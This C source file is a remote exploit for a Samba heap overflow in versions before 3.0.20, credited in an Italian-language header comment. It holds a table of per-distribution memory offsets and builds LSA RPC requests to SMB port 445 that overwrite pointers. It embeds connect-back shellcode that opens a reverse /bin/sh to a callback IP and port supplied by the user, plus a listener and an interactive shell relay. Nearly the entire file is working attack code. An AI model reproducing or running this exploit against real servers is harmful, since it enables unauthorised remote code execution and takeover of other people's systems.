#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/time.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "in_frontend.h"

void shell(int);
void child(int);
char *my;
int sm;
/***********************************************************************************/
/* Samba < 3.0.20 heap overflow				   			   */
/* per Debian 3.0.14a Debian e altre versioni					   */
/* per versionare il sorgente:							   */
/* usare l'opzione DEBUG						  	   */
/* usare free() dalla GOT (non funziona su Mandriva,RHEL e Fedora)	 	   */  
/* da qualche parte nel 3°/4° pacchetto di risposta dice la versione di Samba	   */
/* coded by zuc@hack.it						  	   */
/***********************************************************************************/
#define VERSN 25
struct versions vers[VERSN] =
{
{"Debian 3.1 r0 X restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0 X",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0a X 1st",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0a noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r0a noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r1 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r1 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r2 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r2 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r3 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r3 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r4 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r4 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r5 noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r5 noX",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r6a noX restart",0x0827c000,0x0837f000,30*1024},
{"Debian 3.1 r6a noX",0x0827c000,0x0837f000,30*1024},
{"Slackware 10.0 restart",0x0827c000,0x0837f000,30*1024},
{"Slackware 10.0",0x0827c000,0x0837f000,30*1024},
{"Mandrake 10.1 noX",0x80380000,0x8045b000,30*1024},
{"Mandrake 10.1 X Kde",0x80380000,0x8045b000,30*1024},
{"Samba 3.0.x DEBUG",0x80380000,0x8045b000,30*1024}
};

void LSA(char ip[100],char cb[100],char port[10],int version,int sleep_b)
{
int count=0;
int giro;
if(version==-1)
{
for(giro=0;giro<VERSN;giro++)
{
printf("N:%i OS: %s\n",giro,vers[giro].name);
}
exit(0);
}
sm=shmget(2041,1,0666|IPC_CREAT);
my=shmat(sm,0,0);
my[0]=0x41;
if(version>VERSN+1)
return;
int c=1;
if(version==VERSN+1){
c=VERSN-1;
version=-1;
}
/*
int ff=fork();
if(ff==0)
{
child(atoi(port));
}
*/
for(giro=0;giro<c;giro++)
{
if(my[0]==0x61)
{
while(1)
{
sleep(1);
}
}
count=0;
if(c==VERSN-1)
	version++;
unsigned int start=vers[version].start;
unsigned int end=vers[version].end;
unsigned int step=vers[version].step;
printf("OS: %s\n",vers[version].name);
//for(start;start<end;start+=step)
for(start=0;start<1;start+=step)
{
count++;
printf("count: %i\n",count);
unsigned int off=start;
int sock;
struct sockaddr_in mytcp;
struct hostent * hp;
hp = gethostbyname(ip);

unsigned int addr = inet_addr(ip);


sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
{ 
printf("socket() error...\n");
exit(-1);
}

mytcp.sin_addr.s_addr = addr;

mytcp.sin_family = AF_INET;

mytcp.sin_port=htons(445);


int rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));

    struct smb_info run;
    run.userid[0]=0;
    run.userid[1]=0;
	struct packet a,b;
    a = NegotiateProtocolRequest2nd(run);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
    run=NegotiateProtocolRequestRESPONSE2nd(run);
	a = SessionSetupAndXRequest2nd(run);
	send(sock,a.buf,a.size,0);
if(sleep_b==1)
	sleep(12);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
	run=SessionSetupAndXRequestRESPONSE2nd(run,b);
	a = SessionSetupAndXRequest2ndb(run);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
	run=SessionSetupAndXRequestRESPONSE2ndb(run,b);
	a = TreeConnectAndXRequest2nd(run);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
	run=TreeConnectAndXRequestRESPONSE2nd(run,b);
	a = NTCreateAndXRequest2nd(run,"lsarpc");
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
	run=NTCreateAndXRequestRESPONSE2nd(run,b);
    a =BINDRequest2nd(run,"123457781234abcdef000123456789ab",0);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
    run=BINDRequestRESPONSE2nd(run,b);


	struct packet stub;
    memset(stub.buf,0,sizeof(stub.buf));
    int offset=0;
	memcpy(stub.buf+offset,"\x41\x41\x41\x41",4);
	offset+=4;
	char serv[]="\\\\";
int i;
	for(i=0;i<strlen(serv);i++)
	{
		stub.buf[offset+i]=serv[i];
	}
	offset+=strlen(serv);	
	memset(stub.buf+offset,0,2);
	offset+=2;
	memcpy(stub.buf+offset,"\x1c\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x00\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x00\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x00\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x00\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x01\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x10\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x02\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x01\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x00\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x00\x00\x00\x02",4);
	offset+=4;
    stub.size=offset;
    char opnum=0x6;
	a.size=10;
	memset(a.buf,0,sizeof(a.buf));
	memcpy(a.buf,stub.buf,10);
    a =UniversalMethod(run,a,opnum);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
	run=UniversalMethodRESPONSE(run);
	a.size=offset-10;
	memset(a.buf,0,sizeof(a.buf));
	memcpy(a.buf,stub.buf+10,offset-10);
    a =UniversalMethodFinal(run,a,opnum);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
	run=UniversalMethodRESPONSEFinal(run);
	char policy[32];
	memset(policy,0,sizeof(policy));
	memcpy(policy,b.buf+84,20);
    run=UniversalMethodRESPONSE(run);
    memset(stub.buf,0,sizeof(stub.buf));

    offset=0;
unsigned char nops[2000];
int sx=0,sy=0;
for(sx;sx<2000;sx+=2)
{
nops[sx]=0xeb;
nops[sx+1]=0x20;
if((unsigned char)sx==0xae)
{
nops[sx]=0xeb;
nops[sx+1]=0x20;
}
if(sy!=abs(sx/256))sy++;
}
	char jumper[256];
	int v=0;
	for(v;v<256;v++)
{
jumper[v]=v;
}
    opnum=0xf;
char af[0xb000];
memset(af,0,sizeof(af));
	char numentries[4];
	memcpy(numentries,"\x00\x01\x00\x00",4);
	char numentries2[4];
	memcpy(numentries2,"\x10\x01\x00\x00",4);
	char buf[100000];
	memset(buf,0,sizeof(buf));
	int s=0,ff=0;
	for(s;s<16*257;s+=4)
{
	char off_s[10];
	memset(off_s,0,sizeof(off_s));
	sprintf(off_s,"%x",ff);
	char tok[3];
	tok[2]=0;
	tok[0]=off_s[0];
	tok[1]=off_s[1];
	unsigned char va=hextoint(tok);
buf[s]=0x69;
buf[s+1]=va;
buf[s+2]=0x00;
buf[s+3]=0x00;
ff++;
if(ff>0xff)ff=0;
}
//memcpy(buf+4+(256*16),"\xef\x91\x00\x00",4);// VERSIONE1 3.1r0
memcpy(buf+4+(256*16),"\xef\xbe\x00\x00",4);// VERSIONE1 3.1r0
switch (version)
{
	case 0://3.1 r0 X restart(w)
	memcpy(jumper+0xd4,"\x94\x33\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x94\x33\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xf3\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\xf3\x3b\x08",4);
	break;
	case 1://3.1 r0 X(w)
	memcpy(jumper+0xd4,"\x94\x33\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x94\x33\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x6b\x3a\x08",4);
	memcpy(buf+12+(256*16),"\x00\x6b\x3a\x08",4);
	break;
	case 2://3.1 r0 noX restart, X 1st(w)
	memcpy(jumper+0xd4,"\x94\x33\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x94\x33\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xf3\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\xf3\x3b\x08",4);
	break;
	case 3://3.1 r0 noX(w)
	memcpy(jumper+0xd4,"\x94\x33\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x94\x33\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x70\x3a\x08",4);
	memcpy(buf+12+(256*16),"\x00\x70\x3a\x08",4);
	break;
	case 4://3.1 r0a X 1st(w)
	memcpy(jumper+0xd4,"\x94\x33\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x94\x33\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xec\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\xec\x3b\x08",4);
	break;
	case 5://3.1 r0a noX restart, X restart(w)
	memcpy(jumper+0xd4,"\x94\x33\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x94\x33\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xf4\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\xf4\x3b\x08",4);
	break;
	case 6://3.1 r0a noX,X (w)
	memcpy(jumper+0xd4,"\x94\x33\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x94\x33\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x90\x69\x3a\x08",4);
	memcpy(buf+12+(256*16),"\x90\x69\x3a\x08",4);
	break;
	case 7://3.1 r1 noX restart, X restart(w)
	memcpy(jumper+0xd4,"\x18\xb7\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x18\xb7\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x77\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\x77\x3b\x08",4);
	break;
	case 8://3.1 r1 noX, X(w)
	memcpy(jumper+0xd4,"\x18\xb7\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x18\xb7\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xf0\x39\x08",4);
	memcpy(buf+12+(256*16),"\x00\xf0\x39\x08",4);
	break;
	case 9://3.1 r2 noX restart,X 1st & restart(w)
	memcpy(jumper+0xd4,"\x18\xb7\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x18\xb7\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x77\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\x77\x3b\x08",4);
	break;
	case 10://3.1 r2 noX,X(w)
	memcpy(jumper+0xd4,"\x18\xb7\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x18\xb7\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xf3\x39\x08",4);
	memcpy(buf+12+(256*16),"\x00\xf3\x39\x08",4);
	break;
	case 11://3.1 r3 noX restart
	memcpy(jumper+0xd4,"\x0c\x85\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x0c\x85\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x44\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\x44\x3b\x08",4);
	break;
	case 12://3.1 r3 noX 
	memcpy(jumper+0xd4,"\x0c\x85\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x0c\x85\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xc0\x39\x08",4);
	memcpy(buf+12+(256*16),"\x00\xc0\x39\x08",4);
	break;
	case 13://3.1 r4 noX restart
	memcpy(jumper+0xd4,"\x0c\x85\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x0c\x85\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x47\x3b\x08",4);
	memcpy(buf+12+(256*16),"\x00\x47\x3b\x08",4);
	break;
	case 14://3.1 r4 noX
	memcpy(jumper+0xd4,"\x0c\x85\x2e\x08",4);
	memcpy(buf+8+(256*16),"\x0c\x85\x2e\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xc0\x39\x08",4);
	memcpy(buf+12+(256*16),"\x00\xc0\x39\x08",4);
	break;
	case 15://3.1 r5 noX 1st & restart
	memcpy(jumper+0xd4,"\x8c\x3c\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x8c\x3c\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x00\x3c\x08",4);//CUSTOM 1st START 0x083bf500
	memcpy(buf+12+(256*16),"\x00\x00\x3c\x08",4);
	break;
	case 16://3.1 r5 noX 
	memcpy(jumper+0xd4,"\x8c\x3c\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x8c\x3c\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x73\x3a\x08",4);
	memcpy(buf+12+(256*16),"\x00\x73\x3a\x08",4);
	memcpy(af+22202+0xc,"\x00\x73\x3a\x08",4);
	memcpy(af+22202+0x8,"\x8c\x3c\x2f\x08",4);
	break;
	case 17://3.1 r6a noX 1st & restart
	memcpy(jumper+0xd4,"\x8c\x3c\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x8c\x3c\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x00\x3c\x08",4);
	memcpy(buf+12+(256*16),"\x00\x00\x3c\x08",4);
	break;
	case 18://3.1 r6a noX 
	memcpy(jumper+0xd4,"\x8c\x3c\x2f\x08",4);
	memcpy(buf+8+(256*16),"\x8c\x3c\x2f\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x73\x3a\x08",4);
	memcpy(buf+12+(256*16),"\x00\x73\x3a\x08",4);
	break;
	case 19://Slackware 10.0 restart
	memcpy(jumper+0xd4,"\xd4\x0d\x2a\x08",4);
	memcpy(buf+8+(256*16),"\xd4\x0d\x2a\x08",4);
	
	memcpy(jumper+0xd8,"\x00\x50\x37\x08",4);
	memcpy(buf+12+(256*16),"\x00\x50\x37\x08",4);
	break;
	case 20://Slackware 10.0 
	memcpy(jumper+0xd4,"\xd4\x0d\x2a\x08",4);
	memcpy(buf+8+(256*16),"\xd4\x0d\x2a\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xbc\x39\x08",4);
	memcpy(buf+12+(256*16),"\x00\xbc\x39\x08",4);
	break;
	case 21://Mandrake 10.1 no X
	memcpy(jumper+0xd4,"\x4c\x0d\x2c\x08",4);
	memcpy(buf+8+(256*16),"\x4c\x0d\x2c\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xed\x3d\x08",4);
	memcpy(buf+12+(256*16),"\x00\xed\x3d\x08",4);
	break;
	case 22://Mandrake 10.1 X KDE
	memcpy(jumper+0xd4,"\x4c\x0d\x2c\x08",4);
	memcpy(buf+8+(256*16),"\x4c\x0d\x2c\x08",4);
	
	memcpy(jumper+0xd8,"\x00\xe0\x3d\x08",4);
	memcpy(buf+12+(256*16),"\x00\xe0\x3d\x08",4);
	break;
	case 23://DEBUG
	memcpy(jumper+0xd4,"\x41\x41\x41\x41",4);
	memcpy(buf+8+(256*16),"\x41\x41\x41\x41",4);
	
	memcpy(jumper+0xd8,"\x61\x61\x61\x61",4);
	memcpy(buf+12+(256*16),"\x61\x61\x61\x61",4);
	break;
	default:
	exit(0);
}
	memset(buf+(16*257),0x61,12);
	char off_s[10];
	memset(off_s,0,sizeof(off_s));
	sprintf(off_s,"%x",0x41424344);
	//sprintf(off_s,"%x",off);
	char tok[3];
	tok[2]=0;
	tok[0]=off_s[0];
	tok[1]=off_s[1];
	unsigned char va=hextoint(tok);
	memset(buf+(16*257)+15,va,1);
	tok[0]=off_s[2];
	tok[1]=off_s[3];
	va=hextoint(tok);
	memset(buf+(16*257)+14,va,1);
	tok[0]=off_s[4];
	tok[1]=off_s[5];
	va=hextoint(tok);
	memset(buf+(16*257)+13,va,1);
	tok[0]=off_s[6];
	tok[1]=off_s[7];
	va=hextoint(tok);
	memset(buf+(16*257)+12,va,1);
	memset(buf+(16*257)+16,0x51,4);
	memset(buf+(16*257)+20,0x52,4);
	memset(buf+(16*257)+24,0x53,4);
	memcpy(buf+(16*257)+28,jumper,256);
unsigned char scode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80"
"\x31\xc9\x31\xdb\x6a\x46\x58\xcd\x80"
"\x31\xdb\x6a\x17\x58\xcd\x80"
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x64\x21\x66\x68"
"\x02\x9a\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\x89\xe1\xb0\x0b\xcd\x80";

int cbport;
unsigned int cbip;
cbport = htons(atoi(port));
cbip = inet_addr(cb);
memcpy(&scode[60+48],&cbport,2);
memcpy(&scode[54+48],&cbip,4);
	memset(stub.buf,0,sizeof(stub.buf));
	offset=0;
	memcpy(stub.buf+offset,policy,20);
	offset+=20;
	memcpy(stub.buf+offset,"\x00\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,"\x00\x00\x00\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,numentries,4);
	offset+=4;
	memcpy(stub.buf+offset,"\x04\x00\x02\x00",4);
	offset+=4;
	memcpy(stub.buf+offset,numentries2,4);
	offset+=4;
	memcpy(stub.buf+offset,buf,(16*257)+28+256);
	offset+=(16*257)+28+256;
	memcpy(stub.buf+offset,nops,2000);
	offset+=2000;
	memcpy(stub.buf+offset,scode,sizeof(scode)-1);
	offset+=sizeof(scode)-1;
    stub.size=offset;
	short p=offset/1024;
	int pg;
	for(pg=0;pg<p;pg++)
	{
		struct packet ax;
		memset(ax.buf,0,sizeof(ax.buf));
		memcpy(ax.buf,stub.buf+pg*1024,1024);
		ax.size=1024;
    a =UniversalMethod(run,ax,opnum);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=recv(sock,b.buf,2048,0);
    run=UniversalMethodRESPONSE(run);
	}
	struct packet ay;
	memset(ay.buf,0,sizeof(ay.buf));
	memcpy(ay.buf,stub.buf+p*1024,(offset-(p*1024)));
	ay.size=(offset-(p*1024));
    a =UniversalMethodFinal(run,ay,opnum);
	send(sock,a.buf,a.size,0);
    memset(b.buf,0,sizeof(b.buf));
b.size=0;
//b.size=recv(sock,b.buf,2048,0);
//if(b.size>0)
//printf("Patched\n");
usleep(250000);
shutdown(sock,1);
close(sock);
}









}



	return;
}

void child(int port)
{
int sock2,sock3;
sm=shmget(2041,1,0);
my=shmat(sm,0,0);

printf("[*] waiting for shell\n");
struct sockaddr_in mytcp;

mytcp.sin_family = AF_INET;
mytcp.sin_addr.s_addr = 0;
mytcp.sin_port=htons((unsigned short)port);

sock2=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

bind(sock2,(struct sockaddr *)&mytcp,16);
listen(sock2,1);
int len=16;
sock3 = accept(sock2, (struct sockaddr*)&mytcp,&len); 
if(sock3)
{ 
my[0]=0x61;
exit(0);
}
else
{
printf("error\n");
}
shutdown(sock2,2);
close(sock2);
shutdown(sock3,3);
close(sock3);

exit(0);
}


void shell(int sock)
{
int l;
char buf[1024];
struct timeval time;
unsigned long ul[2];

time.tv_sec = 1;
time.tv_usec = 0;

while (1)
{
ul[0] = 1;
ul[1] = sock;

l = select (0, (fd_set *)&ul, NULL, NULL, &time);
if(l == 1)
{ 
l = recv (sock, buf, sizeof (buf), 0);
if (l <= 0)
{
printf ("bye bye...\n");
return;
}
l = write (1, buf, l);
if (l <= 0)
{
printf ("bye bye...\n");
return;
}
}
else
{
l = read (0, buf, sizeof (buf));
if (l <= 0)
{
printf("bye bye...\n");
return;
}
l = send(sock, buf, l, 0);
if (l <= 0)
{
printf("bye bye...\n");
return;
}
}
}
}

